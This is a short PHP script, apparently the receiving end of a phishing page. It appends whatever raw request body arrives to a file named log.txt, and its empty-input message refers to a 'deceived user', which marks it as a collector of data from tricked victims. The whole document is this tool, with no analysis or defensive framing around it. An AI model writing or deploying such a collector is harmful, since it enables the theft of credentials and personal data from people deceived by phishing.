<?php
$file = 'log.txt';
$content = file_get_contents("php://input");
if (empty($content)) {
    echo "No deceived user sent.";
} else {
    if (file_put_contents($file, $content . "\n", FILE_APPEND | LOCK_EX)) {
        echo "Successfully saved to " . $file;
    } else {
        echo "Could not save to " . $file;
    }
}
